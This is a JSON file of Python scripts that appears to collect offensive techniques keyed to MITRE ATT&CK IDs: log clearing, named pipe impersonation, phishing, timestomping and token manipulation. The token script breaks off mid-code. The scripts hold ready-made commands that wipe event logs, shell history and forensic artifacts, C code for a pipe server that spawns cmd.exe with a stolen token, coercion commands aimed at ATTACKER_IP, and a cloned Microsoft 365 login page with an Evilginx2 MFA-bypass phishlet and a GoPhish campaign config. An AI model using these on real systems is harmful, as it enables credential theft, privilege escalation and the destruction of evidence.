{
  "log_clearing_manipulation": "import os\nimport struct\nimport hashlib\nimport time\n\nclass LogManipulator:\n    \"\"\"Log clearing and event log manipulation (T1070.001)\"\"\"\n    \n    # Windows Event Log channels\n    EVENT_LOGS = {\n        'Security': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\Security.evtx', 'critical': True},\n        'System': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\System.evtx', 'critical': True},\n        'Application': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\Application.evtx', 'critical': False},\n        'PowerShell': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\Windows PowerShell.evtx', 'critical': True},\n        'PowerShell Operational': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\Microsoft-Windows-PowerShell%4Operational.evtx', 'critical': True},\n        'Sysmon': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\Microsoft-Windows-Sysmon%4Operational.evtx', 'critical': True},\n        'WMI': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\Microsoft-Windows-WMI-Activity%4Operational.evtx', 'critical': False},\n        'TaskScheduler': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\Microsoft-Windows-TaskScheduler%4Operational.evtx', 'critical': False},\n        'TerminalServices': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx', 'critical': True},\n        'Bits-Client': {'path': 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\Microsoft-Windows-Bits-Client%4Operational.evtx', 'critical': False},\n    }\n    \n    # Key event IDs to target\n    TARGET_EVENTS = {\n        4624: 'Successful logon',\n        4625: 'Failed logon',\n        4648: 'Logon with explicit credentials',\n        4672: 'Special privileges assigned',\n        4688: 'Process creation',\n        4697: 'Service installed',\n        4698: 'Scheduled task created',\n        4720: 'User account created',\n        4732: 'Member added to security group',\n        7045: 'New service installed',\n        1102: 'Audit log cleared (Security)',\n        104:  'Event log cleared (System)',\n    }\n    \n    # Linux log locations\n    LINUX_LOGS = {\n        'auth.log': '/var/log/auth.log',\n        'syslog': '/var/log/syslog',\n        'wtmp': '/var/log/wtmp',\n        'btmp': '/var/log/btmp',\n        'lastlog': '/var/log/lastlog',\n        'secure': '/var/log/secure',\n        'messages': '/var/log/messages',\n        'bash_history': '~/.bash_history',\n        'audit': '/var/log/audit/audit.log',\n        'cron': '/var/log/cron',\n        'journal': '/var/log/journal/',\n    }\n    \n    def __init__(self):\n        self.cleared = []\n    \n    def generate_windows_clear_commands(self):\n        \"\"\"Generate Windows log clearing commands\"\"\"\n        commands = {\n            'wevtutil_clear_all': 'for /F \"tokens=*\" %1 in (\\'wevtutil.exe el\\') DO wevtutil.exe cl \"%1\"',\n            'wevtutil_security': 'wevtutil cl Security',\n            'wevtutil_system': 'wevtutil cl System',\n            'wevtutil_powershell': 'wevtutil cl \"Windows PowerShell\"',\n            'powershell_clear': 'Get-WinEvent -ListLog * | ForEach-Object { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }',\n            'powershell_security': 'Clear-EventLog -LogName Security',\n            'event_log_service': 'Stop-Service -Name EventLog -Force; Remove-Item C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\*.evtx -Force; Start-Service -Name EventLog',\n        }\n        return commands\n    \n    def generate_linux_clear_commands(self):\n        \"\"\"Generate Linux log clearing commands\"\"\"\n        commands = {\n            'truncate_auth': 'truncate -s 0 /var/log/auth.log',\n            'truncate_syslog': 'truncate -s 0 /var/log/syslog',\n            'clear_wtmp': 'truncate -s 0 /var/log/wtmp',\n            'clear_btmp': 'truncate -s 0 /var/log/btmp',\n            'clear_lastlog': 'truncate -s 0 /var/log/lastlog',\n            'clear_history': 'cat /dev/null > ~/.bash_history && history -c',\n            'clear_journal': 'journalctl --rotate && journalctl --vacuum-time=1s',\n            'utmpdump_modify': 'utmpdump /var/log/wtmp > /tmp/wtmp.txt && vim /tmp/wtmp.txt && utmpdump -r /tmp/wtmp.txt > /var/log/wtmp',\n            'shred_logs': 'shred -vfz -n 5 /var/log/auth.log',\n            'disable_history': 'unset HISTFILE; export HISTSIZE=0; set +o history',\n            'timestomp_log': 'touch -r /var/log/syslog /var/log/auth.log',\n        }\n        return commands\n    \n    def generate_selective_clear(self):\n        \"\"\"Generate selective event removal (more stealthy)\"\"\"\n        script = '''# Selective Event Removal (PowerShell)\n# More stealthy than clearing entire log\n\n# Method 1: Export, filter, reimport\n$events = Get-WinEvent -LogName Security | Where-Object {\n    $_.Id -ne 4624 -or  # Keep logon events except...\n    $_.Properties[5].Value -ne \"attacker_username\"  # ...the attacker's\n}\n\n# Method 2: Using wevtutil with XPath filter\n# Export events NOT matching our criteria\nwevtutil epl Security filtered.evtx \"/q:*[System[(EventID!=4688)]]\" /ow:true\n\n# Method 3: Phant0m - kill Event Log threads in svchost\n# Suspends threads in the Event Log service without stopping it\n# Event ID 1102 is NOT generated (log appears healthy but stops recording)'''\n        return script\n    \n    def generate_anti_forensics(self):\n        \"\"\"Generate comprehensive anti-forensics checklist\"\"\"\n        checklist = {\n            'Event Logs': 'Clear or selectively modify Windows event logs',\n            'USN Journal': 'fsutil usn deletejournal /D C:',\n            'Prefetch': 'del C:\\\\Windows\\\\Prefetch\\\\*.pf',\n            'Recent Files': 'del %APPDATA%\\\\Microsoft\\\\Windows\\\\Recent\\\\*',\n            'Thumbcache': 'del %LOCALAPPDATA%\\\\Microsoft\\\\Windows\\\\Explorer\\\\thumbcache_*',\n            'Jump Lists': 'del %APPDATA%\\\\Microsoft\\\\Windows\\\\Recent\\\\AutomaticDestinations\\\\*',\n            'ShellBags': 'reg delete \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\" /f',\n            'UserAssist': 'reg delete \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UserAssist\" /f',\n            'RDP Cache': 'del %LOCALAPPDATA%\\\\Microsoft\\\\Terminal Server Client\\\\Cache\\\\*',\n            'PowerShell History': 'del (Get-PSReadLineOption).HistorySavePath',\n            'SRUM': 'del C:\\\\Windows\\\\System32\\\\SRU\\\\SRUDB.dat',\n            'BAM/DAM': 'reg delete \"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\bam\\\\State\\\\UserSettings\" /f',\n        }\n        return checklist\n    \n    def run(self):\n        print('=== Log Clearing & Manipulation (T1070.001) ===')\n        lm = LogManipulator()\n        \n        print('[*] Windows Event Log channels (critical for defenders):')\n        for name, info in lm.EVENT_LOGS.items():\n            crit = '[CRITICAL]' if info['critical'] else '[        ]'\n            print(f'    {crit} {name}')\n        \n        print(f'\\n[*] Key Event IDs to clear:')\n        for eid, desc in lm.TARGET_EVENTS.items():\n            print(f'    {eid}: {desc}')\n        \n        print(f'\\n--- Windows Log Clearing ---')\n        for name, cmd in lm.generate_windows_clear_commands().items():\n            print(f'    [{name}]: {cmd}')\n        \n        print(f'\\n--- Linux Log Clearing ---')\n        for name, cmd in lm.generate_linux_clear_commands().items():\n            print(f'    [{name}]: {cmd}')\n        \n        print(f'\\n--- Selective Event Removal ---')\n        script = lm.generate_selective_clear()\n        for line in script.split('\\n')[:8]:\n            print(f'    {line}')\n        \n        print(f'\\n--- Anti-Forensics Checklist ---')\n        for artifact, action in lm.generate_anti_forensics().items():\n            print(f'    {artifact}: {action}')\n        \n        print(f'\\n[*] Detection: Event ID 1102 (Security log cleared)')\n        print(f'[*] Detection: Event ID 104 (System log cleared)')\n        print(f'[*] Detection: Forward logs to SIEM (attacker can\\'t clear remote copy)')\n\nlm = LogManipulator()\nlm.run()",
  "named_pipe_impersonation": "import os\nimport struct\nimport hashlib\nimport threading\nimport time\n\nclass NamedPipeImpersonator:\n    \"\"\"Named pipe impersonation for privilege escalation (T1134.001)\"\"\"\n    \n    # Well-known named pipes\n    KNOWN_PIPES = {\n        'Print Spooler': {'pipe': '\\\\\\\\pipe\\\\spoolss', 'service': 'Spooler', 'system': True},\n        'EFSRPC': {'pipe': '\\\\\\\\pipe\\\\efsrpc', 'service': 'EFS', 'system': True},\n        'LSARPC': {'pipe': '\\\\\\\\pipe\\\\lsarpc', 'service': 'LSA', 'system': True},\n        'SAMR': {'pipe': '\\\\\\\\pipe\\\\samr', 'service': 'SAM', 'system': True},\n        'NETLOGON': {'pipe': '\\\\\\\\pipe\\\\netlogon', 'service': 'Netlogon', 'system': True},\n        'SVCCTL': {'pipe': '\\\\\\\\pipe\\\\svcctl', 'service': 'Service Control Manager', 'system': True},\n        'ATSVC': {'pipe': '\\\\\\\\pipe\\\\atsvc', 'service': 'Task Scheduler', 'system': True},\n        'WKSSVC': {'pipe': '\\\\\\\\pipe\\\\wkssvc', 'service': 'Workstation', 'system': True},\n        'SRVSVC': {'pipe': '\\\\\\\\pipe\\\\srvsvc', 'service': 'Server', 'system': True},\n        'SQL Server': {'pipe': '\\\\\\\\pipe\\\\sql\\\\query', 'service': 'MSSQLSERVER', 'system': False},\n    }\n    \n    # Pipe access modes\n    PIPE_ACCESS = {\n        'PIPE_ACCESS_DUPLEX': 0x00000003,\n        'PIPE_ACCESS_INBOUND': 0x00000001,\n        'PIPE_ACCESS_OUTBOUND': 0x00000002,\n        'FILE_FLAG_FIRST_PIPE_INSTANCE': 0x00080000,\n    }\n    \n    def __init__(self):\n        self.pipes = []\n    \n    def generate_pipe_server_code(self):\n        \"\"\"Generate C code for named pipe impersonation server\"\"\"\n        code = '''// Named Pipe Impersonation Server\n#include <windows.h>\n#include <stdio.h>\n\n#define PIPE_NAME L\"\\\\\\\\\\\\\\\\.\\\\\\\\pipe\\\\\\\\EvilPipe\"\n\nBOOL ImpersonateClient() {\n    HANDLE hPipe;\n    SECURITY_DESCRIPTOR sd;\n    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);\n    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);  // Allow everyone\n    \n    SECURITY_ATTRIBUTES sa = {sizeof(sa), &sd, FALSE};\n    \n    // 1. Create named pipe with permissive DACL\n    hPipe = CreateNamedPipe(PIPE_NAME,\n        PIPE_ACCESS_DUPLEX,\n        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,\n        1, 1024, 1024, 0, &sa);\n    \n    if (hPipe == INVALID_HANDLE_VALUE) {\n        printf(\"[-] CreateNamedPipe failed: %d\\\\n\", GetLastError());\n        return FALSE;\n    }\n    \n    printf(\"[*] Waiting for client connection...\\\\n\");\n    \n    // 2. Wait for connection\n    ConnectNamedPipe(hPipe, NULL);\n    printf(\"[+] Client connected!\\\\n\");\n    \n    // 3. Impersonate the client\n    if (!ImpersonateNamedPipeClient(hPipe)) {\n        printf(\"[-] ImpersonateNamedPipeClient failed: %d\\\\n\", GetLastError());\n        CloseHandle(hPipe);\n        return FALSE;\n    }\n    \n    // 4. Get impersonated token\n    HANDLE hToken;\n    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);\n    \n    // 5. Duplicate as primary token\n    HANDLE hPrimary;\n    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,\n        SecurityImpersonation, TokenPrimary, &hPrimary);\n    \n    // 6. Create process with impersonated token\n    STARTUPINFO si = {sizeof(si)};\n    PROCESS_INFORMATION pi;\n    CreateProcessWithTokenW(hPrimary, LOGON_WITH_PROFILE,\n        L\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\", NULL,\n        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);\n    \n    printf(\"[+] Spawned cmd.exe with impersonated token!\\\\n\");\n    \n    RevertToSelf();\n    CloseHandle(hPrimary);\n    CloseHandle(hToken);\n    CloseHandle(hPipe);\n    return TRUE;\n}'''\n        return code\n    \n    def generate_pipe_trigger(self):\n        \"\"\"Generate methods to coerce SYSTEM to connect to our pipe\"\"\"\n        triggers = {\n            'SpoolSample': {\n                'desc': 'Coerce Print Spooler to authenticate to our pipe',\n                'cmd': 'SpoolSample.exe TARGET_DC ATTACKER_IP',\n                'pipe': '\\\\\\\\attacker_ip\\\\pipe\\\\spoolss',\n            },\n            'PetitPotam': {\n                'desc': 'Coerce EFS to authenticate (unauthenticated!)',\n                'cmd': 'PetitPotam.py attacker_ip target_dc',\n                'pipe': '\\\\\\\\attacker_ip\\\\pipe\\\\efsrpc',\n            },\n            'PrinterBug': {\n                'desc': 'MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx',\n                'cmd': 'printerbug.py domain/user:pass@target_dc attacker_ip',\n                'pipe': '\\\\\\\\attacker_ip\\\\pipe\\\\spoolss',\n            },\n            'DFSCoerce': {\n                'desc': 'Coerce via DFS RPC',\n                'cmd': 'dfscoerce.py -u user -p pass -d domain attacker_ip target_dc',\n                'pipe': '\\\\\\\\attacker_ip\\\\pipe\\\\netdfs',\n            },\n        }\n        return triggers\n    \n    def enumerate_pipes(self):\n        \"\"\"Generate pipe enumeration commands\"\"\"\n        commands = [\n            'Get-ChildItem \\\\\\\\.\\\\pipe\\\\ | Select-Object Name',\n            'pipelist.exe (Sysinternals)',\n            '[System.IO.Directory]::GetFiles(\"\\\\\\\\.\\\\pipe\\\\\")',\n        ]\n        return commands\n    \n    def run(self):\n        print('=== Named Pipe Impersonation (T1134.001) ===')\n        npi = NamedPipeImpersonator()\n        \n        print('[*] Attack flow:')\n        print('    1. Create named pipe with permissive ACL')\n        print('    2. Coerce privileged process to connect')\n        print('    3. ImpersonateNamedPipeClient() \u2192 get client token')\n        print('    4. DuplicateTokenEx() \u2192 get primary token')\n        print('    5. CreateProcessWithTokenW() \u2192 spawn as impersonated user')\n        \n        print(f'\\n[*] Well-known named pipes:')\n        for name, info in npi.KNOWN_PIPES.items():\n            sys = '[SYSTEM]' if info['system'] else '[Service]'\n            print(f'    {sys} {name}: {info[\"pipe\"]} ({info[\"service\"]})')\n        \n        print(f'\\n[*] Coercion techniques:')\n        for name, info in npi.generate_pipe_trigger().items():\n            print(f'    [{name}]: {info[\"desc\"]}')\n            print(f'        Command: {info[\"cmd\"]}')\n        \n        print(f'\\n[*] Pipe enumeration:')\n        for cmd in npi.enumerate_pipes():\n            print(f'    {cmd}')\n        \n        print(f'\\n--- Pipe Server Code (excerpt) ---')\n        code = npi.generate_pipe_server_code()\n        for line in code.split('\\n')[:12]:\n            print(f'    {line}')\n        print(f'    ... ({len(code.split(chr(10)))} lines total)')\n        \n        print(f'\\n[*] Detection: Sysmon Event ID 17/18 (Pipe created/connected)')\n        print(f'[*] Detection: Monitor for unusual named pipe creation patterns')\n\nnpi = NamedPipeImpersonator()\nnpi.run()",
  "phishing_credential_harvest": "import os\nimport hashlib\nimport json\nimport base64\nimport time\n\nclass PhishingFramework:\n    \"\"\"Phishing email with credential harvesting page (T1566.001)\"\"\"\n    \n    # Phishing pretext categories\n    PRETEXTS = {\n        'IT Support': 'Password expiration, MFA enrollment, account verification',\n        'HR/Payroll': 'Benefits update, W-2 form, salary review',\n        'Executive': 'CEO/CFO urgent wire transfer, NDA review',\n        'Delivery': 'Package tracking, invoice, shipping notification',\n        'Security Alert': 'Suspicious login, account locked, verify identity',\n        'Cloud Service': 'SharePoint shared document, OneDrive notification',\n        'Social Media': 'LinkedIn connection, Facebook security alert',\n    }\n    \n    # Email header manipulation\n    EMAIL_HEADERS = {\n        'From spoofing': 'Set display name vs actual sender',\n        'Reply-To': 'Different from From address',\n        'Return-Path': 'Bounce address manipulation',\n        'X-Mailer': 'Spoof legitimate email client',\n        'Message-ID': 'Match target domain format',\n        'DKIM': 'Use lookalike domain with valid DKIM',\n        'List-Unsubscribe': 'Add to bypass spam filters',\n    }\n    \n    # Credential harvesting techniques\n    HARVEST_METHODS = {\n        'Clone site': 'Mirror legitimate login page',\n        'Reverse proxy': 'Evilginx2/Modlishka - real-time MFA bypass',\n        'Browser-in-browser': 'Fake browser window within page',\n        'OAuth consent': 'Malicious OAuth app requesting permissions',\n        'QR code': 'QR to phishing page (QRishing)',\n        'HTML smuggling': 'Base64 encoded page in email attachment',\n    }\n    \n    def __init__(self):\n        self.campaigns = []\n    \n    def generate_credential_page(self, target_service='Microsoft 365'):\n        \"\"\"Generate credential harvesting page HTML\"\"\"\n        html = '''<!DOCTYPE html>\n<html>\n<head>\n    <title>Sign in to your account</title>\n    <style>\n        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; margin: 0; }\n        .container { max-width: 440px; margin: 80px auto; background: white; padding: 44px; }\n        .logo { text-align: center; margin-bottom: 20px; }\n        input[type=\"email\"], input[type=\"password\"] {\n            width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #666;\n            box-sizing: border-box; font-size: 15px;\n        }\n        .btn { background: #0067b8; color: white; border: none; padding: 10px 20px;\n               font-size: 15px; cursor: pointer; width: 100%; }\n        .links { margin-top: 15px; font-size: 13px; }\n        .links a { color: #0067b8; text-decoration: none; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"logo\">\n            <img src=\"data:image/svg+xml;base64,...\" width=\"108\">\n            <h2 style=\"font-weight:400\">Sign in</h2>\n        </div>\n        <form method=\"POST\" action=\"/collect\">\n            <input type=\"email\" name=\"email\" placeholder=\"Email, phone, or Skype\" required>\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n            <input type=\"hidden\" name=\"timestamp\" id=\"ts\">\n            <input type=\"hidden\" name=\"user_agent\" id=\"ua\">\n            <button type=\"submit\" class=\"btn\">Sign in</button>\n        </form>\n        <div class=\"links\">\n            <a href=\"#\">Can\\'t access your account?</a><br>\n            <a href=\"#\">Sign in with a security key</a>\n        </div>\n    </div>\n    <script>\n        document.getElementById('ts').value = Date.now();\n        document.getElementById('ua').value = navigator.userAgent;\n    </script>\n</body>\n</html>'''\n        return html\n    \n    def generate_evilginx_config(self, target_domain):\n        \"\"\"Generate Evilginx2 phishlet config for MFA bypass\"\"\"\n        config = f'''# Evilginx2 phishlet for {target_domain}\nname: '{target_domain.replace(\".\", \"_\")}'\nmin_ver: '2.3.0'\n\nproxy_hosts:\n  - phish_sub: 'login'\n    orig_sub: 'login'\n    domain: '{target_domain}'\n    session: true\n    is_landing: true\n\nauth_tokens:\n  - domain: '.{target_domain}'\n    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']\n\ncredentials:\n  username:\n    key: 'login'\n    search: 'input[name=\"loginfmt\"]'\n    type: 'post'\n  password:\n    key: 'passwd'\n    search: 'input[name=\"passwd\"]'\n    type: 'post'\n\nlogin:\n  domain: 'login.{target_domain}'\n  path: '/'\n'''\n        return config\n    \n    def generate_gophish_campaign(self, target_org):\n        \"\"\"Generate GoPhish campaign configuration\"\"\"\n        campaign = {\n            'name': f'{target_org} - Password Reset',\n            'template': {\n                'subject': f'Action Required: {target_org} Password Expiration Notice',\n                'from': f'IT Security <security@{target_org.lower().replace(\" \", \"\")}.com>',\n                'html': '<p>Your password expires in 24 hours. <a href=\"{{{{.URL}}}}\">Reset now</a></p>',\n            },\n            'landing_page': {\n                'name': f'{target_org} Login',\n                'capture_credentials': True,\n                'capture_passwords': True,\n                'redirect_url': f'https://login.microsoftonline.com',\n            },\n            'sending_profile': {\n                'smtp_from': f'security@{target_org.lower().replace(\" \", \"\")}.com',\n                'host': 'smtp.mailgun.org:587',\n            }\n        }\n        return campaign\n    \n    def run(self):\n        print('=== Phishing Framework (T1566.001) ===')\n        phish = PhishingFramework()\n        \n        print('[*] Phishing pretext categories:')\n        for category, desc in phish.PRETEXTS.items():\n            print(f'    {category}: {desc}')\n        \n        print(f'\\n[*] Email header manipulation:')\n        for header, desc in phish.EMAIL_HEADERS.items():\n            print(f'    {header}: {desc}')\n        \n        print(f'\\n[*] Credential harvesting methods:')\n        for method, desc in phish.HARVEST_METHODS.items():\n            print(f'    {method}: {desc}')\n        \n        print(f'\\n--- Credential Page (excerpt) ---')\n        html = phish.generate_credential_page()\n        for line in html.split('\\n')[:15]:\n            print(f'    {line}')\n        print(f'    ... ({len(html.split(chr(10)))} lines)')\n        \n        print(f'\\n--- Evilginx2 Phishlet (MFA bypass) ---')\n        config = phish.generate_evilginx_config('microsoftonline.com')\n        for line in config.split('\\n')[:10]:\n            print(f'    {line}')\n        \n        print(f'\\n--- GoPhish Campaign Config ---')\n        campaign = phish.generate_gophish_campaign('Acme Corp')\n        print(f'    Subject: {campaign[\"template\"][\"subject\"]}')\n        print(f'    From: {campaign[\"template\"][\"from\"]}')\n        print(f'    Capture passwords: {campaign[\"landing_page\"][\"capture_passwords\"]}')\n        print(f'    Redirect: {campaign[\"landing_page\"][\"redirect_url\"]}')\n        \n        print(f'\\n[*] Tools: GoPhish, Evilginx2, Modlishka, King Phisher')\n        print(f'[*] Detection: DMARC/SPF/DKIM, URL sandboxing, user training')\n\nphish = PhishingFramework()\nphish.run()",
  "timestomping": "import os\nimport struct\nimport time\nimport hashlib\n\nclass Timestomper:\n    \"\"\"Timestomping to modify file metadata (T1070.006)\"\"\"\n    \n    # NTFS timestamp types\n    NTFS_TIMESTAMPS = {\n        '$STANDARD_INFORMATION (SI)': {\n            'Created': 'File creation time',\n            'Modified': 'Last write time',\n            'Accessed': 'Last access time',\n            'MFT Modified': 'MFT entry modification (not visible in Explorer)',\n        },\n        '$FILE_NAME (FN)': {\n            'Created': 'Hard to modify without raw disk access',\n            'Modified': 'Updated on rename/move operations',\n            'Accessed': 'Rarely modified',\n            'MFT Modified': 'Updated on any metadata change',\n        }\n    }\n    \n    # Windows FILETIME epoch (Jan 1, 1601)\n    FILETIME_EPOCH = 116444736000000000  # 100-nanosecond intervals from 1601 to 1970\n    \n    def __init__(self):\n        self.modifications = []\n    \n    def unix_to_filetime(self, unix_timestamp):\n        \"\"\"Convert Unix timestamp to Windows FILETIME\"\"\"\n        ft = int((unix_timestamp * 10000000) + self.FILETIME_EPOCH)\n        return struct.pack('<Q', ft)\n    \n    def filetime_to_unix(self, filetime_bytes):\n        \"\"\"Convert Windows FILETIME to Unix timestamp\"\"\"\n        ft = struct.unpack('<Q', filetime_bytes)[0]\n        return (ft - self.FILETIME_EPOCH) / 10000000\n    \n    def generate_timestomp_commands(self, filepath, target_time):\n        \"\"\"Generate timestomping commands for multiple platforms\"\"\"\n        time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(target_time))\n        time_str_ps = time.strftime('%m/%d/%Y %H:%M:%S', time.gmtime(target_time))\n        time_str_touch = time.strftime('%Y%m%d%H%M.%S', time.gmtime(target_time))\n        \n        commands = {\n            'PowerShell (all timestamps)': [\n                f'$(Get-Item \"{filepath}\").CreationTime = \"{time_str_ps}\"',\n                f'$(Get-Item \"{filepath}\").LastWriteTime = \"{time_str_ps}\"',\n                f'$(Get-Item \"{filepath}\").LastAccessTime = \"{time_str_ps}\"',\n            ],\n            'PowerShell (UTC)': [\n                f'$(Get-Item \"{filepath}\").CreationTimeUtc = \"{time_str_ps}\"',\n                f'$(Get-Item \"{filepath}\").LastWriteTimeUtc = \"{time_str_ps}\"',\n                f'$(Get-Item \"{filepath}\").LastAccessTimeUtc = \"{time_str_ps}\"',\n            ],\n            'Linux/Mac (touch)': [\n                f'touch -t {time_str_touch} \"{filepath}\"',\n                f'touch -d \"{time_str}\" \"{filepath}\"',\n                f'touch -a -t {time_str_touch} \"{filepath}\"  # access time only',\n                f'touch -m -t {time_str_touch} \"{filepath}\"  # modify time only',\n            ],\n            'Meterpreter': [\n                f'timestomp \"{filepath}\" -m \"{time_str}\"',\n                f'timestomp \"{filepath}\" -a \"{time_str}\"',\n                f'timestomp \"{filepath}\" -c \"{time_str}\"',\n                f'timestomp \"{filepath}\" -e \"{time_str}\"',\n            ],\n            'NinjaCopy (raw NTFS)': [\n                f'Invoke-NinjaCopy -Path \"{filepath}\" -Verbose  # Bypasses $FN timestamps',\n            ],\n        }\n        return commands\n    \n    def generate_bulk_timestomp(self, directory, reference_file):\n        \"\"\"Generate script to match timestamps of all files to a reference\"\"\"\n        script = ('# Bulk timestomping - match all files to reference\\n'\n            '$ref = Get-Item \"' + reference_file + '\"\\n'\n            '$refCreate = $ref.CreationTime\\n'\n            '$refModify = $ref.LastWriteTime\\n'\n            '$refAccess = $ref.LastAccessTime\\n'\n            'Get-ChildItem \"' + directory + '\" -Recurse | ForEach-Object {\\n'\n            '    $_.CreationTime = $refCreate\\n'\n            '    $_.LastWriteTime = $refModify\\n'\n            '    $_.LastAccessTime = $refAccess\\n'\n            '    Write-Host \"[+] Timestomped: $($_.FullName)\"\\n'\n            '}')\n        return script\n    \n    def detect_timestomping(self):\n        \"\"\"Generate detection queries\"\"\"\n        indicators = {\n            'SI vs FN mismatch': '$SI Created != $FN Created (most reliable indicator)',\n            'Impossible timestamps': 'Created time after Modified time',\n            'Round timestamps': 'Timestamps at exactly :00:00 (manual setting)',\n            'Future timestamps': 'Timestamps in the future',\n            'Cluster analysis': 'Many files with identical timestamps (bulk stomp)',\n            'USN Journal': 'USN Journal records original operation times',\n            'Event logs': 'Event ID 4663 (Object access) preserves real times',\n        }\n        return indicators\n    \n    def python_timestomp(self, filepath, target_time):\n        \"\"\"Python-based timestomping\"\"\"\n        try:\n            os.utime(filepath, (target_time, target_time))\n            print(f'[+] Modified access/modify times for: {filepath}')\n            print(f'    New timestamp: {time.ctime(target_time)}')\n            return True\n        except Exception as e:\n            print(f'[-] Error: {e}')\n            return False\n    \n    def run(self):\n        print('=== Timestomping Engine (T1070.006) ===')\n        ts = Timestomper()\n        \n        print('[*] NTFS timestamp attributes:')\n        for attr, timestamps in ts.NTFS_TIMESTAMPS.items():\n            print(f'\\n  [{attr}]')\n            for name, desc in timestamps.items():\n                print(f'    {name}: {desc}')\n        \n        # Target: look like a Windows system file from 2019\n        target_time = time.mktime(time.strptime('2019-04-12 09:15:33', '%Y-%m-%d %H:%M:%S'))\n        \n        print(f'\\n[*] Timestomping commands for \"C:\\\\malware.exe\" \u2192 2019-04-12 09:15:33:')\n        commands = ts.generate_timestomp_commands('C:\\\\malware.exe', target_time)\n        for method, cmds in commands.items():\n            print(f'\\n  [{method}]')\n            for cmd in cmds:\n                print(f'    {cmd}')\n        \n        # FILETIME conversion\n        print(f'\\n--- FILETIME Conversion ---')\n        ft = ts.unix_to_filetime(target_time)\n        print(f'    Unix: {int(target_time)}')\n        print(f'    FILETIME: {ft.hex()}')\n        print(f'    Roundtrip: {time.ctime(ts.filetime_to_unix(ft))}')\n        \n        # Detection\n        print(f'\\n[*] Detection indicators:')\n        for name, desc in ts.detect_timestomping().items():\n            print(f'    {name}: {desc}')\n        \n        print(f'\\n[*] Forensic tools: MFTECmd, Plaso/log2timeline, NTFS Log Tracker')\n\nts = Timestomper()\nts.run()",
  "token_manipulation": "import struct\nimport os\nimport hashlib\n\nclass TokenManipulator:\n    \"\"\"Token manipulation and privilege elevation (T1134)\"\"\"\n    \n    # Windows token privilege constants\n    TOKEN_PRIVILEGES = {\n        'SeDebugPrivilege': {'value': 20, 'desc': 'Debug programs - access any process', 'risk': 'CRITICAL'},\n        'SeImpersonatePrivilege': {'value': 29, 'desc': 'Impersonate client after authentication', 'risk': 'HIGH'},\n        'SeAssignPrimaryTokenPrivilege': {'value': 3, 'desc': 'Replace process-level token', 'risk': 'HIGH'},\n        'SeTcbPrivilege': {'value': 7, 'desc': 'Act as part of the operating system', 'risk': 'CRITICAL'},\n        'SeBackupPrivilege': {'value': 17, 'desc': 'Back up files - bypass ACLs for read', 'risk': 'HIGH'},\n        'SeRestorePrivilege': {'value': 18, 'desc': 'Restore files - bypass ACLs for write', 'risk': 'HIGH'},\n        'SeLoadDriverPrivilege': {'value': 10, 'desc': 'Load/unload device drivers', 'risk': 'CRITICAL'},\n        'SeTakeOwnershipPrivilege': {'value': 9, 'desc': 'Take ownership of any object', 'risk': 'HIGH'},\n        'SeCreateTokenPrivilege': {'value': 2, 'desc': 'Create a token object', 'risk': 'CRITICAL'},\n    }\n    \n    # Token elevation techniques\n    TECHNIQUES = {\n        'Token Duplication': {\n            'api': 'DuplicateTokenEx',\n            'desc': 'Duplicate an existing token with higher privileges',\n            'requires': 'TOKEN_DUPLICATE access to target token',\n        },\n        'Token Impersonation': {\n            'api': 'ImpersonateLoggedOnUser / SetThreadToken',\n            'desc': 'Impersonate security context of another user',\n            'requires': 'SeImpersonatePrivilege',\n        },\n        'Token Theft': {\n            'api': 'OpenProcessToken + DuplicateToken',\n            'desc': 'Steal token from running SYSTEM process',\n            'requires': 'SeDebugPrivilege + elevated process',\n        },\n        'Make Token': {\n            'api': 'LogonUser + ImpersonateLoggedOnUser',\n            'desc': 'Create new logon session with known credentials',\n            'requires': 'Valid credentials',\n        },\n        'Potato Attacks': {\n            'api': 'NTLM relay + Token impersonation',\n            'desc': 'JuicyPotato/PrintSpoofer/RoguePotato - SeImpersonate \u2192 SYSTEM',\n            'requires': 'SeImpersonatePrivilege (service accounts)',\n        },\n    }\n    \n    # Potato family attacks\n    POTATO_VARIANTS = {\n        'JuicyPotato': 'COM server abuse, arbitrary CLSID, works on Win7-2019',\n        'PrintSpoofer': 'Named pipe impersonation via Print Spooler, Win10/2019',\n        'RoguePotato': 'Remote OXID resolver, bypasses JuicyPotato mitigations',\n        'SweetPotato': 'Collection of potato techniques in one tool',\n        'GodPotato': '.NET CLR-based, works on Win8.1-Win11/2022',\n        'EfsPotato': 'EFS RPC abuse for impersonation',\n    }\n    \n    def __init__(self):\n        self.tokens = []\n    \n    def enumerate_tokens(self):\n        \"\"\"Generate token enumeration commands\"\"\"\n        commands = {\n            